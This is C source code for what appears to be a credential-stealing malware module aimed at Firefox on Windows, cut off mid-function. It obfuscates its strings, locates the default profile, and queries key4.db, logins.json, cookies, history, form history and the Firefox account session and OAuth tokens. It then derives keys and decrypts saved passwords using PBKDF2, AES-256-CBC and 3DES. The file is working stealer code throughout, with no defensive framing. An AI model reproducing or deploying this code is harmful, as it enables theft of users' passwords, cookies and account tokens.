#include "Headers.h"
#include "sqlite3.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define BUFFER_SIZE_08                  8
#define BUFFER_SIZE_14                  14
#define BUFFER_SIZE_20                  20
#define BUFFER_SIZE_24                  24

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_FF_BASE_PATH                OBFA_S("Mozilla\\Firefox")
#define STR_FF_PROFILES_INI             OBFA_S("Mozilla\\Firefox\\profiles.ini")
#define STR_FF_KEY4_DB                  OBFA_S("key4.db")
#define STR_FF_LOGINS_JSON              OBFA_S("logins.json")
#define STR_FF_COOKIES_DB               OBFA_S("cookies.sqlite")
#define STR_FF_PLACES_DB                OBFA_S("places.sqlite")
#define STR_FF_FORMHISTORY_DB           OBFA_S("formhistory.sqlite")
#define STR_FF_SIGNED_IN_USER           OBFA_S("signedInUser.json")

#define STR_JSON_KEY_ACCOUNT_DATA       OBFA_S("accountData")
#define STR_JSON_KEY_EMAIL              OBFA_S("email")
#define STR_JSON_KEY_UID                OBFA_S("uid")
#define STR_JSON_KEY_SESSION_TOKEN      OBFA_S("sessionToken")
#define STR_JSON_KEY_OAUTH_TOKENS       OBFA_S("oauthTokens")
#define STR_JSON_KEY_PROFILE            OBFA_S("profile")
#define STR_JSON_KEY_TOKEN              OBFA_S("token")
#define STR_JSON_KEY_OLDSYNC            OBFA_S("https://identity.mozilla.com/apps/oldsync")
#define STR_JSON_KEY_DEVICE             OBFA_S("device")
#define STR_JSON_KEY_SEND_TAB_KEYS      OBFA_S("sendTabKeys")
#define STR_JSON_KEY_CLOSE_TAB_KEYS     OBFA_S("closeTabKeys")
#define STR_JSON_KEY_PRIVATE_KEY        OBFA_S("privateKey")
#define STR_JSON_KEY_VERIFIED           OBFA_S("verified")

#define STR_FF_PROFILE_SECTION          OBFA_S("[Profile")
#define STR_FF_PATH_KEY                 OBFA_S("Path=")
#define STR_FF_INSTALL_DEFAULT_KEY      OBFA_S("Default=")
#define STR_FF_DEFAULT_KEY              OBFA_S( "Default=1")
#define STR_FF_INSTALL_SECTION          OBFA_S("[Install")

#define SQLQUERY_FF_METADATA            OBFA_S("SELECT item1, item2 FROM metadata WHERE id = 'password';")
#define SQLQUERY_FF_PRIVATE             OBFA_S("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL ORDER BY length(a11) DESC;")
#define SQLQUERY_FF_COOKIES             OBFA_S("SELECT host, path, name, value, expiry FROM moz_cookies;")
#define SQLQUERY_FF_HISTORY             OBFA_S("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0;")
#define SQLQUERY_FF_BOOKMARKS           OBFA_S("SELECT b.title, p.url, b.dateAdded FROM moz_bookmarks b "  \
                                               "JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 AND p.url IS NOT NULL;")
#define SQLQUERY_FF_FORMHISTORY         OBFA_S("SELECT fieldname, value, timesUsed, firstUsed FROM moz_formhistory;")

#define STR_JSON_KEY_LOGINS             OBFA_S("logins")
#define STR_JSON_KEY_HOSTNAME           OBFA_S("hostname")
#define STR_JSON_KEY_ENCRYPTED_USER     OBFA_S("encryptedUsername")
#define STR_JSON_KEY_ENCRYPTED_PASS     OBFA_S("encryptedPassword")
#define STR_JSON_KEY_FORM_SUBMIT_URL    OBFA_S("formSubmitURL")
#define STR_JSON_KEY_TIME_CREATED       OBFA_S("timeCreated")
#define STR_JSON_KEY_TIME_LAST_USED     OBFA_S("timeLastUsed")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// ASN.1 Length Encoding
#define ASN1_LENGTH_SHORT_FORM_MAX          0x7F    // Max value for short form (1 byte length)
#define ASN1_LENGTH_LONG_FORM_FLAG          0x80    // Bit 7 set indicates long form
#define ASN1_LENGTH_ONE_BYTE                0x81    // Long form: 1 byte follows for length
#define ASN1_LENGTH_TWO_BYTES               0x82    // Long form: 2 bytes follow for length

// ASN.1 Tag Types
#define ASN1_TAG_INTEGER                    0x02    // INTEGER type
#define ASN1_TAG_OCTET_STRING               0x04    // OCTET STRING type 
#define ASN1_TAG_OBJECT_IDENTIFIER          0x06    // OBJECT IDENTIFIER type (OID)
#define ASN1_TAG_SEQUENCE                   0x30    // SEQUENCE type 

// ASN.1 OIDs
#define OID_PKCS5_PBES2_SIZE    9
#define OID_PKCS5_PBKDF2_SIZE   9
#define OID_HMAC_SHA256_SIZE    8
#define OID_AES256_CBC_SIZE     9
#define OID_DES_EDE3_CBC_SIZE   8

#define OID_PKCS5_PBES2     OBFBYTES_S(OID_PKCS5_PBES2_SIZE,  0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0D)
#define OID_PKCS5_PBKDF2    OBFBYTES_S(OID_PKCS5_PBKDF2_SIZE, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x05, 0x0C)
#define OID_HMAC_SHA256     OBFBYTES_S(OID_HMAC_SHA256_SIZE,  0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x02, 0x09)
#define OID_AES256_CBC      OBFBYTES_S(OID_AES256_CBC_SIZE,   0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2A)
#define OID_DES_EDE3_CBC    OBFBYTES_S(OID_DES_EDE3_CBC_SIZE, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x03, 0x07)



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static LPSTR GetFirefoxDefaultProfileRelPath()
{
    LPSTR   pszProfilesIniPath          = NULL,
            pszFileContent              = NULL,
            pszCursor                   = NULL,
            pszLineEnd                  = NULL,
            pszResult                   = NULL;
    DWORD   dwFileSize                  = 0x00;
    BOOL    bInProfile                  = FALSE,
            bInInstall                  = FALSE,
            bIsDefault                  = FALSE;
    CHAR    szCurrentPath[MAX_PATH]     = { 0 };
    CHAR    szFallbackPath[MAX_PATH]    = { 0 };

   if (!(pszProfilesIniPath = GetBrowserDataFilePath(BROWSER_FIREFOX, STR_FF_PROFILES_INI)))
        return NULL;

    if (!ReadFileFromDiskA(pszProfilesIniPath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    pszCursor = pszFileContent;

    while (pszCursor && *pszCursor)
    {
        LPSTR pszCR = NULL;

        if ((pszLineEnd = StrChrA(pszCursor, '\n')))
            *pszLineEnd = '\0';

        if ((pszCR = StrChrA(pszCursor, '\r')))
            *pszCR = '\0';

        if (*pszCursor == '[')
        {
            if (bInProfile && bIsDefault && szCurrentPath[0])
                StringCchCopyA(szFallbackPath, MAX_PATH, szCurrentPath);

            szCurrentPath[0]    = '\0';
            bIsDefault          = FALSE;
            bInProfile          = (StrStrIA(pszCursor, STR_FF_PROFILE_SECTION) != NULL);
            bInInstall          = (StrStrIA(pszCursor, STR_FF_INSTALL_SECTION) != NULL);
        }
        else if (bInInstall)
        {
            if (StrCmpNIA(pszCursor, STR_FF_INSTALL_DEFAULT_KEY, lstrlenA(STR_FF_INSTALL_DEFAULT_KEY)) == 0)
            {
                StringCchCopyA(szCurrentPath, MAX_PATH, pszCursor + lstrlenA(STR_FF_INSTALL_DEFAULT_KEY));
                for (LPSTR p = szCurrentPath; *p; p++)
                    if (*p == '/') *p = '\\';

                pszResult = DuplicateAnsiString(szCurrentPath);
                goto _END_OF_FUNC;
            }
        }
        else if (bInProfile)
        {
            if (StrCmpNIA(pszCursor, STR_FF_PATH_KEY, lstrlenA(STR_FF_PATH_KEY)) == 0)
            {
                StringCchCopyA(szCurrentPath, MAX_PATH, pszCursor + lstrlenA(STR_FF_PATH_KEY));
                for (LPSTR p = szCurrentPath; *p; p++)
                    if (*p == '/') *p = '\\';
            }
            else if (StrCmpNIA(pszCursor, STR_FF_DEFAULT_KEY, lstrlenA(STR_FF_DEFAULT_KEY)) == 0)
            {
                bIsDefault = TRUE;
            }
        }

        pszCursor = pszLineEnd ? pszLineEnd + 1 : NULL;
    }

    if (bInProfile && bIsDefault && szCurrentPath[0])
        StringCchCopyA(szFallbackPath, MAX_PATH, szCurrentPath);

    if (szFallbackPath[0])
        pszResult = DuplicateAnsiString(szFallbackPath);

_END_OF_FUNC:
    HEAP_FREE(pszProfilesIniPath);
    HEAP_FREE(pszFileContent);
    return pszResult;
}

static LPSTR GetFirefoxFilePath(IN LPCSTR pszFileName)
{
    static LPSTR    s_pszCachedProfilePath  = NULL;
    LPSTR           pszFilePath             = NULL;
    CHAR            szRelPath[MAX_PATH]     = { 0 };

    if (!s_pszCachedProfilePath)
    {
        if (!(s_pszCachedProfilePath = GetFirefoxDefaultProfileRelPath()))
        {
            DBGA("[!] Failed To Get Default Firefox Profile Path");
            return NULL;
        }
    }

    StringCchPrintfA(szRelPath, MAX_PATH, "%s\\%s\\%s", STR_FF_BASE_PATH, s_pszCachedProfilePath, pszFileName);

    pszFilePath = GetBrowserDataFilePath(BROWSER_FIREFOX, szRelPath);

    return pszFilePath;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL Asn1GetLength(IN PBYTE pbData, IN DWORD cbData, OUT PDWORD pdwLength, OUT PDWORD pdwHeaderSize)
{
    if (cbData < 1) return FALSE;

    if (pbData[0] < ASN1_LENGTH_LONG_FORM_FLAG)
    {
        *pdwLength      = pbData[0];
        *pdwHeaderSize  = 1;
    }
    else if (pbData[0] == ASN1_LENGTH_ONE_BYTE)
    {
        if (cbData < 2) return FALSE;
        *pdwLength      = pbData[1];
        *pdwHeaderSize  = 2;
    }
    else if (pbData[0] == ASN1_LENGTH_TWO_BYTES)
    {
        if (cbData < 3) return FALSE;
        *pdwLength      = (pbData[1] << 8) | pbData[2];
        *pdwHeaderSize  = 3;
    }
    else
    {
        return FALSE;
    }

    return TRUE;
}

static PBYTE Asn1FindOid(IN PBYTE pbData, IN DWORD cbData, IN const BYTE* pbOid, IN DWORD cbOid)
{
    for (DWORD i = 0; i + cbOid <= cbData; i++)
    {
        if (memcmp(pbData + i, pbOid, cbOid) == 0)
            return pbData + i;
    }
    return NULL;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL DeriveKeyPbkdf2(IN PBYTE pbPassword, IN DWORD cbPassword, IN PBYTE pbSalt, IN DWORD cbSalt, IN DWORD dwIterations, IN DWORD cbDerivedKey, OUT PBYTE pbDerivedKey)
{
    BCRYPT_ALG_HANDLE   hAlg        = NULL;
    NTSTATUS            ntStatus    = 0x00;
    BOOL                bResult     = FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptDeriveKeyPBKDF2(hAlg, pbPassword, cbPassword, pbSalt, cbSalt, dwIterations, pbDerivedKey, cbDerivedKey, 0)) != 0)
    {
        DBGA("[!] BCryptDeriveKeyPBKDF2 Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

static BOOL DecryptAesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYTE pbCiphertext, IN DWORD dwCiphertext, OUT PBYTE* ppbPlaintext, OUT PDWORD pdwPlaintext)
{
    BCRYPT_ALG_HANDLE   hAlg                        = NULL;
    BCRYPT_KEY_HANDLE   hKey                        = NULL;
    PBYTE               pbPlaintext                 = NULL;
    DWORD               dwPlaintext                 = 0x00,
                        dwResult                    = 0x00;
    NTSTATUS            ntStatus                    = 0x00;
    BYTE                pIvCopy[BUFFER_SIZE_16]     = { 0 };
    BOOL                bResult                     = FALSE;

    if (!pbKey || !pbIv || !pbCiphertext || !ppbPlaintext || !pdwPlaintext)
        return FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        return FALSE;
    }

    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
    {
        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
    {
        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_16);

    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
    {
        DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
        goto _END_OF_FUNC;
    }

    if (!(pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPlaintext)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_16);

    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_16, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
    {
        DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
        goto _END_OF_FUNC;
    }

    *ppbPlaintext   = pbPlaintext;
    *pdwPlaintext   = dwResult;
    pbPlaintext     = NULL;
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbPlaintext);
    if (hKey) 
        BCryptDestroyKey(hKey);
    if (hAlg) 
        BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

static BOOL Decrypt3DesCbc(IN PBYTE pbKey, IN DWORD dwKey, IN PBYTE pbIv, IN PBYTE pbCiphertext, IN DWORD dwCiphertext, OUT PBYTE* ppbPlaintext, OUT PDWORD pdwPlaintext)
{
    BCRYPT_ALG_HANDLE   hAlg                        = NULL;
    BCRYPT_KEY_HANDLE   hKey                        = NULL;
    PBYTE               pbPlaintext                 = NULL;
    DWORD               dwPlaintext                 = 0x00,
                        dwResult                    = 0x00;
    NTSTATUS            ntStatus                    = 0x00;
    BYTE                pIvCopy[BUFFER_SIZE_08]     = { 0 };
    BOOL                bResult                     = FALSE;

    if (!pbKey || !pbIv || !pbCiphertext || !ppbPlaintext || !pdwPlaintext)
        return FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_3DES_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != 0)
    {
        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, dwKey, 0)) != 0)
    {
        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_08);

    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, NULL, 0, &dwPlaintext, BCRYPT_BLOCK_PADDING)) != 0)
    {
        DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
        goto _END_OF_FUNC;
    }

    if (!(pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPlaintext)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(pIvCopy, pbIv, BUFFER_SIZE_08);

    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, dwCiphertext, NULL, pIvCopy, BUFFER_SIZE_08, pbPlaintext, dwPlaintext, &dwResult, BCRYPT_BLOCK_PADDING)) != 0)
    {
        DBGA("[!] BCryptDecrypt [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
        goto _END_OF_FUNC;
    }

    *ppbPlaintext   = pbPlaintext;
    *pdwPlaintext   = dwResult;
    pbPlaintext     = NULL;
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbPlaintext);
    if (hKey) 
        BCryptDestroyKey(hKey);
    if (hAlg) 
        BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

static BOOL ComputeSha1Hash(IN PBYTE pbData1, IN DWORD dwData1, IN OPTIONAL PBYTE pbData2, IN OPTIONAL DWORD dwData2, IN OUT PBYTE pbHash, IN DWORD dwHash)
{
    BCRYPT_ALG_HANDLE   hAlg        = NULL;
    BCRYPT_HASH_HANDLE  hHash       = NULL;
    NTSTATUS            ntStatus    = 0x00;
    BOOL                bResult     = FALSE;

    if (!pbData1 || !dwData1 || !pbHash || dwHash < BUFFER_SIZE_20)
        return FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        return FALSE;
    }

    if ((ntStatus = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)) != 0)
    {
        DBGA("[!] BCryptCreateHash Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptHashData(hHash, pbData1, dwData1, 0)) != 0)
    {
        DBGA("[!] BCryptHashData [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
        goto _END_OF_FUNC;
    }

    if (pbData2 && dwData2 > 0)
    {
        if ((ntStatus = BCryptHashData(hHash, pbData2, dwData2, 0)) != 0)
        {
            DBGA("[!] BCryptHashData [%d] Failed With Error: 0x%08X", __LINE__, ntStatus);
            goto _END_OF_FUNC;
        }
    }

    if ((ntStatus = BCryptFinishHash(hHash, pbHash, dwHash, 0)) != 0)
    {
        DBGA("[!] BCryptFinishHash Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hHash) 
        BCryptDestroyHash(hHash);
    if (hAlg) 
        BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL DecryptPbes2(IN PBYTE pbEncrypted, IN DWORD dwEncrypted, IN PBYTE pbPassword, IN DWORD dwPassword, OUT PBYTE* ppbDecrypted, OUT PDWORD pdwDecrypted)
{
    PBYTE   pbSalt          = NULL,
            pbIv            = NULL,
            pbIvCopy        = NULL,
            pbCiphertext    = NULL,
            pbDerivedKey    = NULL,
            pCursor         = NULL;
    DWORD   dwSalt          = 0x00,
            dwIvActual      = 0x00,
            dwCiphertext    = 0x00,
            dwIterations    = 0x00,
            dwDerivedKey    = 0x00,
            dwLen           = 0x00,
            dwHdr           = 0x00,
            dwTmpLen        = 0x00,
            dwTmpHdr        = 0x00;
    BOOL    bUseAes         = FALSE,
            bResult         = FALSE;

    if (!pbEncrypted || !dwEncrypted || !pbPassword || !dwPassword || !ppbDecrypted || !pdwDecrypted)
        return FALSE;

    // Find PBKDF2 OID to locate salt and iterations
    if (!(pCursor = Asn1FindOid(pbEncrypted, dwEncrypted, OID_PKCS5_PBKDF2, OID_PKCS5_PBKDF2_SIZE)))
    {
        DBGA("[!] PBKDF2 OID Was Not Found");
        return FALSE;
    }

    pCursor += OID_PKCS5_PBKDF2_SIZE;

    // Skip to SEQUENCE containing salt
    while (pCursor < pbEncrypted + dwEncrypted && *pCursor != ASN1_TAG_OCTET_STRING)
        pCursor++;

    if (pCursor >= pbEncrypted + dwEncrypted)
    {
        DBGA("[!] Failed To Find Salt OCTET STRING");
        return FALSE;
    }

    pCursor++; // Skip OCTET STRING tag
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwSalt, &dwHdr))
    {
        DBGA("[!] Asn1GetLength Failed For Salt");
        return FALSE;
    }

    pCursor += dwHdr;
    pbSalt  = pCursor;
    pCursor += dwSalt;

    // Get iterations (INTEGER)
    if (*pCursor != ASN1_TAG_INTEGER)
    {
        DBGA("[!] Expected INTEGER Tag For Iterations, Got: 0x%02X", *pCursor);
        return FALSE;
    }

    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr))
    {
        DBGA("[!] Asn1GetLength Failed For Iterations");
        return FALSE;
    }

    pCursor += dwHdr;

    dwIterations = 0;
    for (DWORD i = 0; i < dwLen; i++)
        dwIterations = (dwIterations << 8) | pCursor[i];
    pCursor += dwLen;

    // Check for AES-256-CBC or 3DES-CBC
    if (Asn1FindOid(pbEncrypted, dwEncrypted, OID_AES256_CBC, OID_AES256_CBC_SIZE))
    {
        bUseAes         = TRUE;
        dwDerivedKey    = BUFFER_SIZE_32;
        pCursor         = Asn1FindOid(pbEncrypted, dwEncrypted, OID_AES256_CBC, OID_AES256_CBC_SIZE);
        pCursor         += OID_AES256_CBC_SIZE;
    }
    else if (Asn1FindOid(pbEncrypted, dwEncrypted, OID_DES_EDE3_CBC, OID_DES_EDE3_CBC_SIZE))
    {
        bUseAes         = FALSE;
        dwDerivedKey    = BUFFER_SIZE_24;
        pCursor         = Asn1FindOid(pbEncrypted, dwEncrypted, OID_DES_EDE3_CBC, OID_DES_EDE3_CBC_SIZE);
        pCursor         += OID_DES_EDE3_CBC_SIZE;
    }
    else
    {
        DBGA("[!] Unknown Encryption Algorithm");
        return FALSE;
    }

    // Get IV
    while (pCursor < pbEncrypted + dwEncrypted && *pCursor != ASN1_TAG_OCTET_STRING)
        pCursor++;

    if (pCursor >= pbEncrypted + dwEncrypted)
    {
        DBGA("[!] Failed To Find IV OCTET STRING");
        return FALSE;
    }

    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr))
    {
        DBGA("[!] Asn1GetLength Failed For IV");
        return FALSE;
    }

    pCursor     +=  dwHdr;
    pbIv        =   pCursor;
    dwIvActual  =   dwLen;
    pCursor     +=  dwLen;

    // Get ciphertext (last OCTET STRING in the structure)
    pbCiphertext = NULL;
    while (pCursor < pbEncrypted + dwEncrypted)
    {
        if (*pCursor == ASN1_TAG_OCTET_STRING)
        {
            if (Asn1GetLength(pCursor + 1, dwEncrypted - (DWORD)(pCursor + 1 - pbEncrypted), &dwTmpLen, &dwTmpHdr))
            {
                pbCiphertext    = pCursor + 1 + dwTmpHdr;
                dwCiphertext    = dwTmpLen;
            }
        }
        pCursor++;
    }

    if (!pbCiphertext || dwCiphertext == 0)
    {
        DBGA("[!] Failed To Find Ciphertext");
        return FALSE;
    }

    // Derive key using PBKDF2
    if (!(pbDerivedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDerivedKey)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if (!DeriveKeyPbkdf2(pbPassword, dwPassword, pbSalt, dwSalt, dwIterations, dwDerivedKey, pbDerivedKey))
    {
        HEAP_FREE(pbDerivedKey);
        return FALSE;
    }

    // Build IV with proper handling for Firefox's 14-byte IV quirk
    if (bUseAes)
    {
        if (!(pbIvCopy = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_16)))
        {
            HEAP_FREE_SECURE(pbDerivedKey, dwDerivedKey);
            return FALSE;
        }

        if (dwIvActual == BUFFER_SIZE_14)
        {
            // Firefox key4.db stores 14-byte IV - prepend ASN.1 OCTET STRING tag + length
            pbIvCopy[0] = ASN1_TAG_OCTET_STRING;
            pbIvCopy[1] = BUFFER_SIZE_14;
            RtlCopyMemory(pbIvCopy + 2, pbIv, BUFFER_SIZE_14);
        }
        else
        {
            RtlCopyMemory(pbIvCopy, pbIv, min(dwIvActual, BUFFER_SIZE_16));
        }

        bResult = DecryptAesCbc(pbDerivedKey, dwDerivedKey, pbIvCopy, pbCiphertext, dwCiphertext, ppbDecrypted, pdwDecrypted);
    }
    else
    {
        if (!(pbIvCopy = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BUFFER_SIZE_08)))
        {
            HEAP_FREE_SECURE(pbDerivedKey, dwDerivedKey);
            return FALSE;
        }

        RtlCopyMemory(pbIvCopy, pbIv, min(dwIvActual, BUFFER_SIZE_08));

        bResult = Decrypt3DesCbc(pbDerivedKey, dwDerivedKey, pbIvCopy, pbCiphertext, dwCiphertext, ppbDecrypted, pdwDecrypted);
    }

    if (!bResult) DBGA("[!] %s Decryption Failed", bUseAes ? "AES-256-CBC" : "3DES-CBC");

    HEAP_FREE_SECURE(pbDerivedKey, dwDerivedKey);
    HEAP_FREE(pbIvCopy);
    return bResult;
}

static BOOL DecryptFirefoxSecret(IN PBYTE pbMasterKey, IN DWORD dwMasterKey, IN LPCSTR pszBase64Encrypted, OUT LPSTR* ppszDecrypted)
{
    PBYTE   pbEncrypted     = NULL,
            pbDecrypted     = NULL,
            pbIv            = NULL,
            pbIvFull        = NULL,
            pbCiphertext    = NULL,
            pCursor         = NULL;
    DWORD   dwEncrypted     = 0x00,
            dwDecrypted     = 0x00,
            dwLen           = 0x00,
            dwHdr           = 0x00,
            dwIvLen         = 0x00,
            dwCipherLen     = 0x00;
    LPSTR   pszResult       = NULL;
    BOOL    bResult         = FALSE,
            bUseAes         = FALSE;

    if (!pbMasterKey || !dwMasterKey || !pszBase64Encrypted || !ppszDecrypted)
        return FALSE;

    *ppszDecrypted = NULL;

    // Base64 decode
    if (!(pbEncrypted = Base64Decode(pszBase64Encrypted, lstrlenA(pszBase64Encrypted), &dwEncrypted)))
        return FALSE;

    // Check which algorithm is used
    if (Asn1FindOid(pbEncrypted, dwEncrypted, OID_AES256_CBC, OID_AES256_CBC_SIZE))
        bUseAes = TRUE;
    else if (Asn1FindOid(pbEncrypted, dwEncrypted, OID_DES_EDE3_CBC, OID_AES256_CBC_SIZE))
        bUseAes = FALSE;
    else
    {
        DBGA("[!] Unknown Encryption OID");
        goto _END_OF_FUNC;
    }

    // Parse ASN.1: SEQUENCE { OCTET STRING (keyId), SEQUENCE { OID, OCTET STRING (IV) }, OCTET STRING (ciphertext) }
    pCursor = pbEncrypted;

    // Skip outer SEQUENCE
    if (*pCursor != ASN1_TAG_SEQUENCE) goto _END_OF_FUNC;
    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr;

    // Skip key ID OCTET STRING
    if (*pCursor != ASN1_TAG_OCTET_STRING) goto _END_OF_FUNC;
    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr + dwLen;

    // Parse algorithm SEQUENCE
    if (*pCursor != ASN1_TAG_SEQUENCE) goto _END_OF_FUNC;
    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr;

    // Skip OID
    if (*pCursor != ASN1_TAG_OBJECT_IDENTIFIER) goto _END_OF_FUNC;
    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr + dwLen;

    // Get IV
    if (*pCursor != ASN1_TAG_OCTET_STRING) goto _END_OF_FUNC;
    pCursor++;
    if (!Asn1GetLength(pCursor, dwEncrypted - (DWORD)(pCursor - pbEncrypted), &dwIvLen, &dwHdr)) goto _END_OF_FUNC;
    pCursor += dwHdr;
    pbIv = pCursor;
    pCursor += dwIvLen;

    // Get ciphertext
    if (*pCursor != ASN1_TAG_OCTET_STRING) goto _END_OF_FUNC;
    pCursor++;
